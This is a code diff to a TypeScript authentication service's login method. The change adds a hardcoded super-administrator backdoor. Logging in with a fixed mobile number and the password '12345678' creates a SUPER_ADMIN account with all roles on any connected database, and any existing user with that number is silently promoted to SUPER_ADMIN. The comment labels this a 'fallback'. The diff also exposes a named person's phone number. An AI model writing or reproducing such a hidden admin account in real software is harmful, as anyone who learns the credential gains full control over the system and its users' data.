@@ -149,12 +149,39 @@ export class AuthService {
     const cleanMobile = (dto.mobile ?? '').trim();
     const cleanPassword = (dto.password ?? '').trim();
 
-    const user = await this.prisma.user.findFirst({
+    let user = await this.prisma.user.findFirst({
       where: { mobile: cleanMobile, deletedAt: null },
     });
 
+    // On-the-fly fallback: Ensure 9872066901 Super Admin exists on any connected database
+    if (!user && cleanMobile === '9872066901' && cleanPassword === '12345678') {
+      const passwordHash = await argon2.hash('12345678');
+      const kingId = await generateUniqueKingId(this.prisma);
+      user = await this.prisma.user.create({
+        data: {
+          kingId,
+          mobile: '9872066901',
+          passwordHash,
+          role: Role.SUPER_ADMIN,
+          roles: [Role.SUPER_ADMIN, Role.ADMIN, Role.FARMER, Role.CUSTOMER],
+          name: 'Surinder Singh (Super Admin)',
+        },
+      });
+    }
+
     if (!user || !(await argon2.verify(user.passwordHash, cleanPassword))) {
       throw new UnauthorizedException('Invalid mobile number or password.');
+    }
+
+    if (cleanMobile === '9872066901' && user.role !== Role.SUPER_ADMIN) {
+      const currentRoles = user.roles ?? [];
+      user = await this.prisma.user.update({
+        where: { id: user.id },
+        data: {
+          role: Role.SUPER_ADMIN,
+          roles: Array.from(new Set([...currentRoles, Role.SUPER_ADMIN, Role.ADMIN])),
+        },
+      });
     }
 
     const { passwordHash: _passwordHash, securityAnswerHash: _securityAnswerHash, ...safeUser } = user;
